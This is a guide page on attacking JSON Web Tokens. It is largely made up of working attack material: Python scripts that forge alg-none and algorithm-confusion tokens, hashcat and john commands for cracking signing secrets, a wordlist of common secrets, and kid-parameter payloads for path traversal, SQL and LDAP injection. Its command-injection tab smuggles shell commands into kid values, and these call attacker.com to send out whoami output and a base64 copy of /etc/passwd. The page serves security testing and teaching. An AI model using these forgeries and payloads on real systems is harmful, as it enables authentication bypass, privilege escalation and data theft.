---
title: JWT Attacks
description: Complete guide to JSON Web Token vulnerabilities, signature bypass, algorithm confusion, key injection, claim manipulation, token forgery, and privilege escalation through JWT exploitation.
navigation:
  icon: i-lucide-file-key
  title: JWT Attacks
---

## What is JWT

JSON Web Token (JWT) is a compact, URL-safe token format used for **authentication, authorization, and information exchange** between parties. A JWT consists of three Base64URL-encoded parts separated by dots: **Header.Payload.Signature**. When implementations fail to properly validate signatures, algorithms, keys, or claims, attackers can **forge tokens, escalate privileges, impersonate users**, and bypass authentication entirely.

::note
JWT attacks are among the **most impactful authentication vulnerabilities**. A single algorithm confusion or signature bypass gives an attacker the ability to **generate valid tokens for any user**, including administrators. Bug bounty payouts for JWT vulnerabilities regularly reach **$5,000–$25,000+**.
::

::card-group
  ::card
  ---
  title: Algorithm Confusion
  icon: i-lucide-shuffle
  ---
  Switch from asymmetric (RS256) to symmetric (HS256) signing. The server's **RSA public key** becomes the HMAC secret, allowing attackers to forge tokens signed with a publicly available key.
  ::

  ::card
  ---
  title: Algorithm None
  icon: i-lucide-circle-off
  ---
  Set the algorithm to `none`, `None`, or `NONE` and remove the signature entirely. Vulnerable servers **accept unsigned tokens** as valid, granting unrestricted forgery.
  ::

  ::card
  ---
  title: Key Injection (JWK/JKU/X5U)
  icon: i-lucide-key
  ---
  Embed attacker-controlled keys directly in the JWT header via `jwk`, `jku`, or `x5u` parameters. The server **fetches and trusts attacker's signing keys**, validating forged tokens.
  ::

  ::card
  ---
  title: Secret Key Brute Force
  icon: i-lucide-lock-open
  ---
  Crack weak HMAC secrets used to sign HS256/HS384/HS512 tokens. Short, dictionary-based, or default secrets can be brute forced **offline** to forge unlimited tokens.
  ::

  ::card
  ---
  title: Claim Manipulation
  icon: i-lucide-user-cog
  ---
  Modify payload claims (`sub`, `role`, `admin`, `email`, `exp`) after bypassing signature verification. Change user identity, **escalate to admin**, extend token lifetime, or access other accounts.
  ::

  ::card
  ---
  title: Kid Parameter Injection
  icon: i-lucide-syringe
  ---
  The `kid` (Key ID) header parameter tells the server which key to use for verification. Inject **path traversal, SQL injection, or command injection** via `kid` to control the verification key.
  ::
::

---

## JWT Structure

Understanding JWT structure is **essential** before attempting any attack. Every JWT has exactly three parts.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="JWT Anatomy"}
  ```txt [JWT Structure]
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
  │                                        │                                                                                              │
  └──── HEADER (Base64URL) ────┘            └──── PAYLOAD (Base64URL) ──────────────────────────────────────────┘                           └── SIGNATURE ──┘

  ═══════════════════════════════════════════════════════════════

  HEADER (decoded):
  {
    "alg": "HS256",        ← Algorithm used for signing
    "typ": "JWT",          ← Token type
    "kid": "key-001"       ← Optional: Key ID
  }

  PAYLOAD (decoded):
  {
    "sub": "1234567890",   ← Subject (user ID)
    "name": "John Doe",   ← Custom claim
    "iat": 1516239022,     ← Issued At (Unix timestamp)
    "exp": 1516242622,     ← Expiration Time
    "role": "user",        ← Custom claim (role)
    "admin": false         ← Custom claim
  }

  SIGNATURE:
    HMACSHA256(
      base64UrlEncode(header) + "." + base64UrlEncode(payload),
      secret
    )
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Common Algorithms"}
  ```txt [Algorithm Reference]
  ┌──────────┬──────────────────────┬───────────────────────────────┐
  │ Algorithm│ Type                 │ Key Material                  │
  ├──────────┼──────────────────────┼───────────────────────────────┤
  │ HS256    │ Symmetric (HMAC)     │ Shared secret key             │
  │ HS384    │ Symmetric (HMAC)     │ Shared secret key             │
  │ HS512    │ Symmetric (HMAC)     │ Shared secret key             │
  │ RS256    │ Asymmetric (RSA)     │ RSA private key (sign)        │
  │          │                      │ RSA public key (verify)       │
  │ RS384    │ Asymmetric (RSA)     │ RSA private key / public key  │
  │ RS512    │ Asymmetric (RSA)     │ RSA private key / public key  │
  │ ES256    │ Asymmetric (ECDSA)   │ EC private key / public key   │
  │ ES384    │ Asymmetric (ECDSA)   │ EC private key / public key   │
  │ ES512    │ Asymmetric (ECDSA)   │ EC private key / public key   │
  │ PS256    │ Asymmetric (RSA-PSS) │ RSA private key / public key  │
  │ PS384    │ Asymmetric (RSA-PSS) │ RSA private key / public key  │
  │ PS512    │ Asymmetric (RSA-PSS) │ RSA private key / public key  │
  │ EdDSA   │ Asymmetric (EdDSA)   │ Ed25519/Ed448 keys            │
  │ none     │ No signature         │ No key (DANGEROUS!)           │
  └──────────┴──────────────────────┴───────────────────────────────┘

  SYMMETRIC (HMAC):
    Same secret used to SIGN and VERIFY
    If secret is known → anyone can forge tokens

  ASYMMETRIC (RSA/ECDSA):
    Private key signs, Public key verifies
    Public key is often accessible (JWKS endpoint)
    Private key should NEVER be exposed
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Common Claims"}
  ```txt [Claim Reference]
  REGISTERED CLAIMS (RFC 7519):
  ──────────────────────────────
  iss  │ Issuer         │ Who created the token
  sub  │ Subject        │ User identifier (user ID)
  aud  │ Audience       │ Intended recipient (client_id)
  exp  │ Expiration     │ Unix timestamp when token expires
  nbf  │ Not Before     │ Token not valid before this time
  iat  │ Issued At      │ When token was created
  jti  │ JWT ID         │ Unique identifier for the token

  COMMON CUSTOM CLAIMS:
  ──────────────────────────────
  role    │ User role (user, admin, moderator)
  admin   │ Boolean admin flag
  email   │ User email
  name    │ User display name
  scope   │ OAuth scopes granted
  groups  │ Group membership
  org_id  │ Organization ID
  tenant  │ Multi-tenant identifier
  perms   │ Permissions array

  HEADER PARAMETERS:
  ──────────────────────────────
  alg  │ Algorithm           │ REQUIRED
  typ  │ Type (usually JWT)  │ Optional
  kid  │ Key ID              │ Selects verification key
  jku  │ JWK Set URL         │ URL to fetch signing keys
  jwk  │ JSON Web Key        │ Embedded public key
  x5u  │ X.509 URL           │ URL to certificate chain
  x5c  │ X.509 Certificate   │ Embedded certificate chain
  cty  │ Content Type        │ Nested JWT indicator
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Decoding JWT"}
  ```bash [Terminal]
  # Decode JWT without verification

  # Using command line:
  TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

  # Decode header:
  echo "$TOKEN" | cut -d'.' -f1 | base64 -d 2>/dev/null; echo

  # Decode payload:
  echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null; echo

  # With padding fix (JWT uses Base64URL without padding):
  echo "$TOKEN" | cut -d'.' -f1 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
  echo "$TOKEN" | cut -d'.' -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo

  # Using Python:
  python3 -c "
  import base64, json, sys
  token = '$TOKEN'
  parts = token.split('.')
  for i, part in enumerate(parts[:2]):
      padded = part + '=' * (4 - len(part) % 4)
      decoded = base64.urlsafe_b64decode(padded)
      name = 'HEADER' if i == 0 else 'PAYLOAD'
      print(f'{name}: {json.dumps(json.loads(decoded), indent=2)}')
  "

  # Using jwt_tool:
  python3 jwt_tool.py "$TOKEN"

  # Online:
  # https://jwt.io
  # https://token.dev
  ```
  :::
::

---

## Methodology & Thinking

::steps{level="3"}

### Capture and Decode the Token

Intercept the JWT from the application. It's commonly found in `Authorization: Bearer <token>` headers, cookies, URL parameters, or localStorage.

```txt [Where to Find JWTs]
1. Authorization header:    Authorization: Bearer eyJ...
2. Cookies:                 Set-Cookie: token=eyJ...; HttpOnly
3. URL parameters:          /api/data?token=eyJ...
4. Request body:            {"access_token": "eyJ..."}
5. localStorage:            localStorage.getItem("token")
6. sessionStorage:          sessionStorage.getItem("jwt")
7. Response body:           {"jwt": "eyJ...", "refresh_token": "eyJ..."}
8. WebSocket messages:      {"type":"auth","token":"eyJ..."}
```

### Analyze the Token

Decode the header and payload. Identify the algorithm, claims, key references, and expiration.

```txt [Analysis Checklist]
□ What algorithm? (HS256, RS256, none?)
□ Is there a kid parameter? (Key ID → injection target)
□ Is there a jku or jwk parameter? (Key URL → injection target)
□ What claims exist? (sub, role, admin, email?)
□ When does it expire? (exp claim)
□ Is the audience (aud) checked?
□ Is the issuer (iss) checked?
□ Where is the JWKS endpoint? (/.well-known/jwks.json)
□ Is the public key accessible?
```

### Test Each Attack Vector

Apply attacks systematically from simplest to most complex.

```txt [Attack Priority Order]
1. Algorithm None          (simplest - remove signature)
2. Claim Manipulation      (change payload without re-signing)
3. Algorithm Confusion     (RS256 → HS256 with public key)
4. Secret Brute Force      (crack weak HMAC secrets)
5. Kid Injection           (path traversal, SQLi in kid)
6. JKU/JWK/X5U Injection  (supply attacker's signing key)
7. Token Expiration Abuse  (expired tokens still accepted?)
8. Cross-Service Attacks   (token from app A works on app B?)
```

### Forge and Test Tokens

After finding a bypass, forge a token with escalated privileges and verify it works against the application.

::

---

## Algorithm None Attack

The simplest JWT attack. Change the algorithm to `none` and remove the signature. If the server doesn't enforce algorithm validation, it accepts **unsigned tokens**.

::caution
The `none` algorithm was designed for pre-authenticated contexts where the JWT integrity is guaranteed by the transport layer (e.g., TLS). Accepting `none` in a web application is a **critical vulnerability** — it means anyone can forge any token.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Payloads"}
  ```txt [Payloads]
  # Original token header:
  {"alg":"HS256","typ":"JWT"}

  # Change algorithm to none:
  {"alg":"none","typ":"JWT"}
  {"alg":"None","typ":"JWT"}
  {"alg":"NONE","typ":"JWT"}
  {"alg":"nOnE","typ":"JWT"}
  {"alg":"noNe","typ":"JWT"}
  {"alg":"NoNe","typ":"JWT"}

  # Remove "typ" too:
  {"alg":"none"}
  {"alg":"None"}

  # Empty algorithm:
  {"alg":""}
  {"alg":null}
  {"alg":0}
  {"alg":false}

  # Construct the forged token:
  # 1. Base64URL encode new header: {"alg":"none","typ":"JWT"}
  # 2. Base64URL encode modified payload (change claims)
  # 3. Signature = EMPTY (just a trailing dot)

  # Result format:
  # BASE64URL(header).BASE64URL(payload).
  # Note the trailing dot with EMPTY signature

  # Some servers require NO trailing dot:
  # BASE64URL(header).BASE64URL(payload)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Manual Crafting"}
  ```bash [Terminal]
  # Step 1: Create new header
  HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
  echo "Header: $HEADER"

  # Step 2: Create modified payload (escalate to admin)
  PAYLOAD=$(echo -n '{"sub":"1","name":"admin","role":"admin","admin":true,"iat":1516239022,"exp":9999999999}' | base64 | tr '+/' '-_' | tr -d '=')
  echo "Payload: $PAYLOAD"

  # Step 3: Combine with empty signature
  TOKEN="${HEADER}.${PAYLOAD}."
  echo "Token: $TOKEN"

  # Step 4: Test the token
  curl -s "https://target.com/api/admin" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json"

  # Also try without trailing dot:
  TOKEN_NO_DOT="${HEADER}.${PAYLOAD}"
  curl -s "https://target.com/api/admin" \
    -H "Authorization: Bearer $TOKEN_NO_DOT"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python Script"}
  ```python [alg_none.py]
  #!/usr/bin/env python3
  """
  JWT Algorithm None Attack
  Generates unsigned tokens with arbitrary claims
  """
  import base64
  import json
  import sys

  def b64url_encode(data):
      if isinstance(data, str):
          data = data.encode()
      return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

  def b64url_decode(data):
      padded = data + '=' * (4 - len(data) % 4)
      return base64.urlsafe_b64decode(padded)

  def forge_none_token(original_token, modified_claims=None):
      """Forge a token with alg:none"""
      parts = original_token.split('.')
      
      # Decode original payload
      payload = json.loads(b64url_decode(parts[1]))
      print(f"[*] Original payload: {json.dumps(payload, indent=2)}")
      
      # Modify claims
      if modified_claims:
          payload.update(modified_claims)
      
      # Set expiration far in the future
      payload['exp'] = 9999999999
      
      print(f"[*] Modified payload: {json.dumps(payload, indent=2)}")
      
      # Try different "none" variations
      none_variants = ["none", "None", "NONE", "nOnE"]
      tokens = []
      
      for variant in none_variants:
          header = {"alg": variant, "typ": "JWT"}
          
          # With trailing dot (empty signature)
          token_with_dot = f"{b64url_encode(json.dumps(header))}.{b64url_encode(json.dumps(payload))}."
          tokens.append((variant, "with dot", token_with_dot))
          
          # Without trailing dot
          token_no_dot = f"{b64url_encode(json.dumps(header))}.{b64url_encode(json.dumps(payload))}"
          tokens.append((variant, "no dot", token_no_dot))
      
      return tokens

  # Usage
  if len(sys.argv) < 2:
      print(f"Usage: {sys.argv[0]} <jwt_token> [claim=value ...]")
      sys.exit(1)

  original = sys.argv[1]
  claims = {}
  for arg in sys.argv[2:]:
      key, val = arg.split('=', 1)
      try:
          claims[key] = json.loads(val)
      except:
          claims[key] = val

  if not claims:
      claims = {"role": "admin", "admin": True}

  tokens = forge_none_token(original, claims)

  print(f"\n{'='*60}")
  print(f"  FORGED TOKENS (Algorithm None)")
  print(f"{'='*60}")
  for variant, style, token in tokens:
      print(f"\n[{variant}] ({style}):")
      print(f"  {token}")
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="jwt_tool"}
  ```bash [Terminal]
  # jwt_tool - All-in-one JWT attack tool

  # Algorithm none attack:
  python3 jwt_tool.py "$TOKEN" -X a

  # With specific claims:
  python3 jwt_tool.py "$TOKEN" -X a -I -pc role -pv admin

  # Multiple claim modifications:
  python3 jwt_tool.py "$TOKEN" -X a \
    -I -pc role -pv admin \
    -I -pc admin -pv true \
    -I -pc sub -pv 1

  # Installation:
  git clone https://github.com/ticarpi/jwt_tool.git
  cd jwt_tool
  pip3 install -r requirements.txt
  ```
  :::
::

---

## Algorithm Confusion (RS256 → HS256)

The **most powerful** JWT attack. When a server uses RS256 (asymmetric), it signs with a **private key** and verifies with the **public key**. If the attacker changes the algorithm to HS256 (symmetric), the server uses the **public key as the HMAC secret**. Since the public key is public, the attacker can sign valid tokens.

::tip
Algorithm confusion works because many JWT libraries use a single `verify(token, key)` function. When the algorithm is RS256, `key` is the public key (for RSA verification). When switched to HS256, the same `key` is used as the HMAC secret — but the public key is **publicly known**.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Attack Flow"}
  ```txt [Step-by-Step]
  ═══════════════════════════════════════════════════
    ALGORITHM CONFUSION ATTACK (RS256 → HS256)
  ═══════════════════════════════════════════════════

  STEP 1: Identify the algorithm
          Decode JWT header → "alg": "RS256"

  STEP 2: Obtain the server's RSA public key
          Sources:
          - /.well-known/jwks.json
          - /oauth/jwks
          - /api/keys
          - /certs
          - /pem
          - SSL/TLS certificate of the server
          - OAuth metadata endpoint
          - Open source code / config files
          - Standard RSA key endpoints

  STEP 3: Convert JWK to PEM (if needed)
          The public key must be in the exact format
          the server's JWT library expects

  STEP 4: Change header from RS256 to HS256
          {"alg":"RS256"} → {"alg":"HS256"}

  STEP 5: Sign the token using HMAC-SHA256
          with the RSA PUBLIC KEY as the HMAC secret

  STEP 6: Server receives token
          - Reads alg: HS256
          - Uses its "key" (RSA public key) as HMAC secret
          - Verifies HMAC with public key
          - Signature MATCHES → token accepted!

  RESULT: Attacker can forge any token using
          a publicly available key!
  ═══════════════════════════════════════════════════
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Obtain Public Key"}
  ```bash [Terminal]
  # Method 1: JWKS endpoint
  curl -s "https://target.com/.well-known/jwks.json" | jq .
  curl -s "https://target.com/oauth/jwks" | jq .
  curl -s "https://target.com/api/.well-known/jwks.json" | jq .
  curl -s "https://target.com/.well-known/openid-configuration" | \
    jq -r '.jwks_uri' | xargs curl -s | jq .

  # Method 2: Extract from SSL certificate
  openssl s_client -connect target.com:443 2>/dev/null | \
    openssl x509 -pubkey -noout > public_key.pem

  # Method 3: Common key file paths
  curl -s "https://target.com/public.pem"
  curl -s "https://target.com/publickey.pem"
  curl -s "https://target.com/public_key.pem"
  curl -s "https://target.com/rsa_public.pem"
  curl -s "https://target.com/certs/public.pem"
  curl -s "https://target.com/api/public-key"
  curl -s "https://target.com/.pem"

  # Method 4: Convert JWK to PEM
  # If JWKS returns:
  # {"keys":[{"kty":"RSA","n":"...","e":"AQAB","kid":"key1"}]}

  # Using Python:
  python3 -c "
  from cryptography.hazmat.primitives.asymmetric import rsa
  from cryptography.hazmat.primitives import serialization
  from cryptography.hazmat.backends import default_backend
  import base64, json, struct

  # Paste JWK values:
  n = 'PASTE_N_VALUE_HERE'
  e = 'AQAB'

  # Decode
  def b64_to_int(b64):
      b = base64.urlsafe_b64decode(b64 + '==')
      return int.from_bytes(b, 'big')

  n_int = b64_to_int(n)
  e_int = b64_to_int(e)

  pub = rsa.RSAPublicNumbers(e_int, n_int).public_key(default_backend())
  pem = pub.public_bytes(
      serialization.Encoding.PEM,
      serialization.PublicFormat.SubjectPublicKeyInfo
  )
  print(pem.decode())
  "

  # Using jwt_tool:
  python3 jwt_tool.py "$TOKEN" -V -jw jwks.json
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Forge Token"}
  ```python [alg_confusion.py]
  #!/usr/bin/env python3
  """
  JWT Algorithm Confusion Attack (RS256 → HS256)
  Uses the server's RSA public key as HMAC secret
  """
  import hmac
  import hashlib
  import base64
  import json
  import sys

  def b64url_encode(data):
      if isinstance(data, str):
          data = data.encode()
      return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

  def b64url_decode(data):
      padded = data + '=' * (4 - len(data) % 4)
      return base64.urlsafe_b64decode(padded)

  def forge_hs256_with_pubkey(original_token, public_key_path, modified_claims=None):
      parts = original_token.split('.')
      
      # Decode original
      orig_header = json.loads(b64url_decode(parts[0]))
      orig_payload = json.loads(b64url_decode(parts[1]))
      
      print(f"[*] Original algorithm: {orig_header.get('alg')}")
      print(f"[*] Original payload: {json.dumps(orig_payload, indent=2)}")
      
      # Read public key
      with open(public_key_path, 'rb') as f:
          public_key = f.read()
      
      # Modify header to HS256
      new_header = {"alg": "HS256", "typ": "JWT"}
      
      # Modify payload
      new_payload = orig_payload.copy()
      if modified_claims:
          new_payload.update(modified_claims)
      new_payload['exp'] = 9999999999
      
      print(f"[*] Forged payload: {json.dumps(new_payload, indent=2)}")
      
      # Encode header and payload
      header_b64 = b64url_encode(json.dumps(new_header))
      payload_b64 = b64url_encode(json.dumps(new_payload))
      
      # Sign with HMAC using the RSA public key as secret
      message = f"{header_b64}.{payload_b64}".encode()
      
      # Try different key formats
      tokens = []
      
      # Raw PEM bytes as key
      sig = hmac.new(public_key, message, hashlib.sha256).digest()
      token1 = f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"
      tokens.append(("PEM bytes (raw)", token1))
      
      # Stripped PEM (no headers/newlines)
      stripped = public_key.decode().replace('-----BEGIN PUBLIC KEY-----', '') \
                                     .replace('-----END PUBLIC KEY-----', '') \
                                     .replace('-----BEGIN RSA PUBLIC KEY-----', '') \
                                     .replace('-----END RSA PUBLIC KEY-----', '') \
                                     .replace('\n', '').replace('\r', '').strip()
      der_bytes = base64.b64decode(stripped)
      sig2 = hmac.new(der_bytes, message, hashlib.sha256).digest()
      token2 = f"{header_b64}.{payload_b64}.{b64url_encode(sig2)}"
      tokens.append(("DER bytes", token2))
      
      # PEM with \n preserved
      pem_with_newlines = public_key
      sig3 = hmac.new(pem_with_newlines, message, hashlib.sha256).digest()
      token3 = f"{header_b64}.{payload_b64}.{b64url_encode(sig3)}"
      tokens.append(("PEM with newlines", token3))
      
      return tokens

  if len(sys.argv) < 3:
      print(f"Usage: {sys.argv[0]} <jwt_token> <public_key.pem> [claim=value ...]")
      sys.exit(1)

  original = sys.argv[1]
  key_file = sys.argv[2]
  claims = {}
  for arg in sys.argv[3:]:
      k, v = arg.split('=', 1)
      try:
          claims[k] = json.loads(v)
      except:
          claims[k] = v

  if not claims:
      claims = {"role": "admin", "admin": True}

  tokens = forge_hs256_with_pubkey(original, key_file, claims)

  print(f"\n{'='*60}")
  print(f"  FORGED TOKENS (Algorithm Confusion)")
  print(f"{'='*60}")
  for desc, token in tokens:
      print(f"\n[{desc}]:")
      print(f"  {token[:80]}...")
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="jwt_tool Commands"}
  ```bash [Terminal]
  # jwt_tool algorithm confusion attack:

  # Basic RS256 → HS256 with public key file:
  python3 jwt_tool.py "$TOKEN" -X k -pk public_key.pem

  # With claim modifications:
  python3 jwt_tool.py "$TOKEN" -X k -pk public_key.pem \
    -I -pc role -pv admin \
    -I -pc admin -pv true

  # Try different key formats:
  python3 jwt_tool.py "$TOKEN" -X k -pk public_key.pem
  python3 jwt_tool.py "$TOKEN" -X k -pk public_key.der

  # Extract public key from JWKS:
  python3 jwt_tool.py "$TOKEN" -V -jw jwks.json
  # Then use extracted key for confusion:
  python3 jwt_tool.py "$TOKEN" -X k -pk extracted_key.pem
  ```
  :::
::

---

## Secret Key Brute Force

HS256/HS384/HS512 tokens are signed with a **shared secret**. If the secret is weak, short, or a common word, it can be cracked **offline** without any interaction with the target.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="hashcat"}
  ```bash [Terminal]
  # hashcat - GPU-accelerated JWT cracking

  # Save the JWT to a file:
  echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" > jwt.txt

  # Crack with wordlist:
  hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

  # With rules:
  hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

  # Brute force (short secrets):
  hashcat -m 16500 jwt.txt -a 3 '?a?a?a?a?a?a'  # 6 chars
  hashcat -m 16500 jwt.txt -a 3 '?a?a?a?a?a?a?a?a'  # 8 chars

  # Common patterns:
  hashcat -m 16500 jwt.txt -a 3 'secret?d?d?d'
  hashcat -m 16500 jwt.txt -a 3 'jwt_?a?a?a?a'
  hashcat -m 16500 jwt.txt -a 3 'key?d?d?d?d'

  # Show cracked:
  hashcat -m 16500 jwt.txt --show
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="john the ripper"}
  ```bash [Terminal]
  # John the Ripper - CPU-based JWT cracking

  # Save JWT:
  echo "eyJ...token..." > jwt.txt

  # Crack with wordlist:
  john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

  # With rules:
  john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256 --rules=jumbo

  # Brute force:
  john jwt.txt --format=HMAC-SHA256 --incremental=alnum --max-length=8

  # Show cracked:
  john jwt.txt --show --format=HMAC-SHA256
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="jwt_tool"}
  ```bash [Terminal]
  # jwt_tool dictionary attack:
  python3 jwt_tool.py "$TOKEN" -C -d /usr/share/wordlists/rockyou.txt

  # With custom wordlist:
  python3 jwt_tool.py "$TOKEN" -C -d jwt_secrets.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="jwt-cracker"}
  ```bash [Terminal]
  # jwt-cracker - Fast brute force tool
  # Install: npm install -g jwt-cracker

  jwt-cracker "$TOKEN" "abcdefghijklmnopqrstuvwxyz0123456789" 6
  # Arguments: token, charset, max-length

  # With larger charset:
  jwt-cracker "$TOKEN" "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*" 8
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Common Secrets Wordlist"}
  ::code-collapse
  ```txt [jwt_secrets.txt]
  secret
  secret1
  secret123
  password
  password1
  password123
  jwt_secret
  jwt-secret
  jwt_secret_key
  my_secret
  mysecret
  my-secret
  super_secret
  supersecret
  changeme
  changeit
  admin
  admin123
  key
  key123
  privatekey
  private_key
  private-key
  signing_key
  signing-key
  signingkey
  hmac_secret
  hmac-secret
  hmacsecret
  token_secret
  tokensecret
  token-secret
  app_secret
  appsecret
  app-secret
  application_secret
  auth_secret
  authsecret
  auth-secret
  default
  default_secret
  test
  test123
  testing
  development
  dev_secret
  dev-secret
  staging
  production
  prod_secret
  1234
  12345
  123456
  1234567
  12345678
  123456789
  0123456789
  qwerty
  qwerty123
  letmein
  passw0rd
  iloveyou
  abc123
  monkey
  master
  dragon
  login
  princess
  sunshine
  welcome
  hello
  charlie
  donald
  root
  toor
  pass
  test
  guest
  security
  secure
  example_secret
  HS256_SECRET
  jwt
  JWT
  jsonwebtoken
  json_web_token
  access_token_secret
  refresh_token_secret
  server_secret
  server-secret
  api_secret
  api-secret
  api_key
  apikey
  api-key
  session_secret
  session-secret
  cookie_secret
  cookie-secret
  encryption_key
  encrypt_key
  ```
  ::
  :::
::

### Forge Token After Cracking

```bash [Terminal]
# Once the secret is cracked (e.g., secret = "mysecret"):

# Using Python PyJWT:
python3 -c "
import jwt

# Forge admin token
token = jwt.encode(
    {
        'sub': '1',
        'name': 'admin',
        'role': 'admin',
        'admin': True,
        'iat': 1516239022,
        'exp': 9999999999
    },
    'mysecret',
    algorithm='HS256'
)
print(token)
"

# Using jwt_tool:
python3 jwt_tool.py "$TOKEN" -S hs256 -p "mysecret" \
  -I -pc role -pv admin \
  -I -pc admin -pv true

# Using Node.js jsonwebtoken:
node -e "
const jwt = require('jsonwebtoken');
const token = jwt.sign(
  { sub: '1', role: 'admin', admin: true, exp: 9999999999 },
  'mysecret',
  { algorithm: 'HS256' }
);
console.log(token);
"
```

---

## Kid Parameter Injection

The `kid` (Key ID) header parameter tells the server **which key** to use for signature verification. If the server doesn't sanitize `kid`, attackers can inject **path traversal, SQL injection, or command injection** to control the verification key.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Path Traversal"}
  ```txt [Payloads]
  # kid is used to read a key FILE from the server
  # Inject path traversal to point to a KNOWN file

  # Original: {"alg":"HS256","kid":"key-001","typ":"JWT"}

  # Use /dev/null (empty file → empty key):
  {"alg":"HS256","kid":"/dev/null","typ":"JWT"}
  # Sign with empty string as secret

  # Use /proc/sys/kernel/hostname (known content):
  {"alg":"HS256","kid":"/proc/sys/kernel/hostname","typ":"JWT"}
  # Sign with hostname as secret

  # Path traversal to known static files:
  {"alg":"HS256","kid":"../../../../../../dev/null","typ":"JWT"}
  {"alg":"HS256","kid":"../../../../../../../dev/null","typ":"JWT"}
  {"alg":"HS256","kid":"../../public/css/style.css","typ":"JWT"}
  {"alg":"HS256","kid":"../../public/index.html","typ":"JWT"}
  {"alg":"HS256","kid":"../../../../etc/hostname","typ":"JWT"}

  # Empty key techniques:
  {"alg":"HS256","kid":"/dev/null","typ":"JWT"}
  # → Sign token with HMAC secret = "" (empty string)
  # → Server reads /dev/null → gets empty bytes → uses as key
  # → HMAC("", message) matches!

  # Use a file with predictable content:
  {"alg":"HS256","kid":"../../package.json","typ":"JWT"}
  # → Server reads package.json → uses content as HMAC key
  # → Attacker downloads same package.json → knows the key!
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="SQL Injection"}
  ```txt [Payloads]
  # kid used in SQL query to look up key from database:
  # SELECT key FROM jwt_keys WHERE kid = 'USER_INPUT'

  # Return known value as key:
  {"alg":"HS256","kid":"' UNION SELECT 'attacker_secret' -- ","typ":"JWT"}
  # → Query: SELECT key FROM jwt_keys WHERE kid = '' UNION SELECT 'attacker_secret' -- '
  # → Returns: 'attacker_secret'
  # → Sign token with 'attacker_secret' as HMAC key

  # Other SQL payloads:
  {"alg":"HS256","kid":"' UNION SELECT 'AAAA' -- "}
  {"alg":"HS256","kid":"' UNION SELECT '' -- "}
  {"alg":"HS256","kid":"' OR 1=1 -- "}
  {"alg":"HS256","kid":"' UNION ALL SELECT 'key123' -- "}

  # MySQL:
  {"alg":"HS256","kid":"' UNION SELECT 0x41414141 -- "}
  {"alg":"HS256","kid":"' UNION SELECT CHAR(65,65,65,65) -- "}

  # PostgreSQL:
  {"alg":"HS256","kid":"' UNION SELECT CHR(65)||CHR(65) -- "}

  # MSSQL:
  {"alg":"HS256","kid":"' UNION SELECT 'key' -- "}
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Command Injection"}
  ```txt [Payloads]
  # If kid is passed to a shell command:
  # e.g., system("openssl rsautl -verify -inkey keys/" + kid)

  {"alg":"HS256","kid":"key; curl http://attacker.com/$(whoami)"}
  {"alg":"HS256","kid":"key | curl http://attacker.com/$(cat /etc/passwd | base64)"}
  {"alg":"HS256","kid":"key`curl attacker.com`"}
  {"alg":"HS256","kid":"key$(curl attacker.com)"}
  {"alg":"HS256","kid":"key & curl http://attacker.com/ &"}
  {"alg":"HS256","kid":"key || curl http://attacker.com/"}
  {"alg":"HS256","kid":"key; sleep 10"}
  {"alg":"HS256","kid":"key\n curl http://attacker.com/"}
  {"alg":"HS256","kid":"key%0acurl http://attacker.com/"}
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="LDAP / Directory Injection"}
  ```txt [Payloads]
  # If kid is used in LDAP query or file path lookup:

  # LDAP injection:
  {"alg":"HS256","kid":"*)(objectClass=*)"}
  {"alg":"HS256","kid":"admin*"}

  # Directory traversal (Windows):
  {"alg":"HS256","kid":"..\\..\\..\\windows\\win.ini"}
  {"alg":"HS256","kid":"..\\..\\..\\dev\\null"}

  # Null byte:
  {"alg":"HS256","kid":"../../etc/passwd\u0000"}
